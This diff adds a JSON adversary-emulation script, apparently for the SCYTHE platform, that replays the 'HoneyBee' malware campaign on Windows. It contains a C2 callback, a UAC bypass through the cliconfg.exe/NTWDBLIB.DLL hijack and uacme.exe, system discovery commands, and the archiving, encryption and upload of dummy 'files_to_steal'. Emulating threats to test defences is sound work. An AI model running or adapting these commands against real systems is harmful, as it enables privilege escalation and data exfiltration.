@@ -1,0 +1,321 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "HoneyBee example based off of threat intel from https://www.mcafee.com/blogs/other-blogs/mcafee-labs/mcafee-uncovers-operation-honeybee-malicious-document-campaign-targeting-humanitarian-aid-groups/",
+        "display_name": "HoneyBee",
+        "name": "HoneyBee",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": "--cp 10.0.2.22:443 --multipart 10240 --secure true",
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "depends_on": "8a328046-158f-4bce-bc3c-3c9b5b177512",
+                "module": "controller",
+                "request": "--integrity",
+                "rtags": [
+                    "att&ck-technique:T1069"
+                ],
+                "type": "message"
+            },
+            "2": {
+                "function": "ifelse",
+                "next": 7,
+                "step": 1,
+                "type": "decision",
+                "value": "High",
+                "verb": "contains"
+            },
+            "3": {
+                "module": "loader",
+                "module_to_load": "elevate",
+                "request": "--load elevate",
+                "type": "message"
+            },
+            "4": {
+                "depends_on": "bdcde5a2-dff1-4c59-860b-960f57a12296",
+                "module": "elevate",
+                "request": "--prompt",
+                "rtags": [
+                    "att&ck-technique:T1068",
+                    "att&ck-technique:T1548.002"
+                ],
+                "type": "message"
+            },
+            "5": {
+                "depends_on": "8a328046-158f-4bce-bc3c-3c9b5b177512",
+                "module": "controller",
+                "request": "--integrity",
+                "rtags": [
+                    "att&ck-technique:T1069"
+                ],
+                "type": "message"
+            },
+            "6": {
+                "function": "ifelse",
+                "next": 39,
+                "step": 5,
+                "type": "decision",
+                "value": "High",
+                "verb": "does not contain"
+            },
+            "7": {
+                "module": "loader",
+                "module_to_load": "downloader",
+                "request": "--load downloader",
+                "rtags": [
+                    "att&ck-technique:T1071.001",
+                    "att&ck-technique:T1553.002",
+                    "att&ck-technique:T1218.011"
+                ],
+                "type": "message"
+            },
+            "8": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src \"VFS://shared/HoneyBee/setup.cab\" --dest %TEMP%\\setup.cab",
+                "type": "message"
+            },
+            "9": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src \"VFS://shared/HoneyBee/cliconfg.exe\" --dest %TEMP%\\cliconfg.exe",
+                "type": "message"
+            },
+            "10": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src \"VFS://shared/HoneyBee/dummy.dll\" --dest %TEMP%\\dummy.dll",
+                "type": "message"
+            },
+            "11": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src \"VFS://shared/HoneyBee/install1.bat\" --dest %TEMP%\\install1.bat",
+                "type": "message"
+            },
+            "12": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src \"VFS://shared/HoneyBee/install2.bat\" --dest %TEMP%\\install2.bat",
+                "type": "message"
+            },
+            "13": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src \"VFS://shared/HoneyBee/ipnet.ini\" --dest %TEMP%\\ipnet.ini",
+                "type": "message"
+            },
+            "14": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src \"VFS://shared/HoneyBee/NTWDBLIB.DLL\" --dest %TEMP%\\NTWDBLIB.DLL",
+                "type": "message"
+            },
+            "15": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src \"VFS://shared/HoneyBee/uacme.exe\" --dest %TEMP%\\uacme.exe",
+                "type": "message"
+            },
+            "16": {
+                "module": "loader",
+                "module_to_load": "file",
+                "request": "--load file",
+                "type": "message"
+            },
+            "17": {
+                "depends_on": "e96eccc9-6c98-4246-b809-1849684c7df2",
+                "module": "file",
+                "request": "--create --path \"%TEMP%\\install3.bat\" --size 10KB --random",
+                "rtags": [],
+                "type": "message"
+            },
+            "18": {
+                "module": "loader",
+                "module_to_load": "run",
+                "request": "--load run",
+                "type": "message"
+            },
+            "19": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c \"%TEMP%\\install3.bat\"",
+                "rtags": [
+                    "att&ck-technique:T1059.003"
+                ],
+                "type": "message"
+            },
+            "20": {
+                "depends_on": "e96eccc9-6c98-4246-b809-1849684c7df2",
+                "module": "file",
+                "request": "--create --path \"%systemroot%\\system32\\install4.bat\" --size 10KB --random",
+                "rtags": [],
+                "type": "message"
+            },
+            "21": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c \"%systemroot%\\system32\\install4.bat\"",
+                "rtags": [
+                    "att&ck-technique:T1059.003",
+                    "att&ck-technique:T1543.003"
+                ],
+                "type": "message"
+            },
+            "22": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c wusa %TEMP%\\setup.cab /quiet /extract:%SystemRoot%\\System32 && del /f /q %TEMP%\\setup.cab && cliconfg.exe",
+                "rtags": [
+                    "att&ck-technique:T1059.003"
+                ],
+                "type": "message"
+            },
+            "23": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c expand %TEMP%\\setup.cab -F:* %SystemRoot%\\System32 && del /f /q %TEMP%\\setup.cab && cliconfg.exe",
+                "rtags": [
+                    "att&ck-technique:T1059.003"
+                ],
+                "type": "message"
+            },
+            "24": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c taskkill /im cliconfg.exe /f /t && del /f /q NTWDBLIB.DLL",
+                "rtags": [
+                    "att&ck-technique:T1059.003",
+                    "att&ck-technique:T1053.005",
+                    "att&ck-technique:T1036.004"
+                ],
+                "type": "message"
+            },
+            "25": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c expand %TEMP%\\setup.cab -F:* %TEMP% && cd /d %TEMP% && del /f /q setup.cab && uacme.exe",
+                "rtags": [
+                    "att&ck-technique:T1059.003"
+                ],
+                "type": "message"
+            },
+            "26": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c hostname",
+                "rtags": [
+                    "att&ck-technique:T1059.003",
+                    "att&ck-technique:T1082"
+                ],
+                "type": "message"
+            },
+            "27": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c systeminfo >%TEMP%\\temp.ini",
+                "rtags": [
+                    "att&ck-technique:T1059.003",
+                    "att&ck-technique:T1082"
+                ],
+                "type": "message"
+            },
+            "28": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c tasklist >%TEMP%\\temp.ini",
+                "rtags": [
+                    "att&ck-technique:T1059.003",
+                    "att&ck-technique:T1082",
+                    "att&ck-technique:T1007",
+                    "att&ck-technique:T1057",
+                    "att&ck-technique:T1518"
+                ],
+                "type": "message"
+            },
+            "29": {
+                "module": "loader",
+                "module_to_load": "sysinfo",
+                "request": "--load sysinfo",
+                "type": "message"
+            },
+            "30": {
+                "depends_on": "14ba9c44-45b7-4630-b252-ad578faaeba9",
+                "module": "sysinfo",
+                "request": "",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1082"
+                ],
+                "type": "message"
+            },
+            "31": {
+                "module": "loader",
+                "module_to_load": "uploader",
+                "request": "--load uploader",
+                "type": "message"
+            },
+            "32": {
+                "depends_on": "80a402f2-e448-4818-ab8f-2047a033faea",
+                "module": "uploader",
+                "request": "--remotepath \"%TEMP%\\temp.ini\"",
+                "rtags": [
+                    "att&ck-technique:T1020"
+                ],
+                "type": "message"
+            },
+            "33": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c mkdir \"%TEMP%\\files_to_steal\"",
+                "type": "message"
+            },
+            "34": {
+                "depends_on": "e96eccc9-6c98-4246-b809-1849684c7df2",
+                "module": "file",
+                "request": "--create --path \"%TEMP%\\files_to_steal\\important_file.dat\" --size 10MB --count 5",
+                "type": "message"
+            },
+            "35": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell \"Compress-Archive %TEMP%\\files_to_steal %TEMP%\\temp.zip\"",
+                "rtags": [
+                    "att&ck-technique:T1059.001"
+                ],
+                "type": "message"
+            },
+            "36": {
+                "module": "loader",
+                "module_to_load": "crypt",
+                "request": "--load crypt",
+                "type": "message"
+            },
+            "37": {
+                "depends_on": "ff705b65-037a-4f06-b21e-e74e6cfe32bc",
+                "module": "crypt",
+                "request": "--target \"%TEMP%\\temp.zip\" --encrypt --password \"aDNsbDB3MHJsZA==\"",
+                "rtags": [
+                    "att&ck-technique:T1486"
+                ],
+                "type": "message"
+            },
+            "38": {
+                "depends_on": "80a402f2-e448-4818-ab8f-2047a033faea",
+                "module": "uploader",
+                "request": "--remotepath \"%TEMP%\\temp.zip.$xb\"",
+                "rtags": [
+                    "att&ck-technique:T1020",
+                    "att&ck-technique:T1005"
+                ],
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29"
+    }
+}
